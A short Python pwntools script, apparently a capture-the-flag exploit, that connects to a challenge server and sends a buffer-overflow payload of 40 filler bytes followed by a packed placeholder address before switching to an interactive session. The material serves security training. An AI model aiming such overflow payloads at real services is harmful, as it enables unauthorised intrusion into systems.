from pwn import *

# Connect to the instance
conn = remote('chal.fallctf.com', 5003)
# Use process() for local challenge files.
# conn = process('./challenge')

# Receive the prompt
conn.recvuntil(b'> ')
# Send the payload
conn.sendline(b'A'*40 + p64(0xdeadbeef))

conn.interactive()
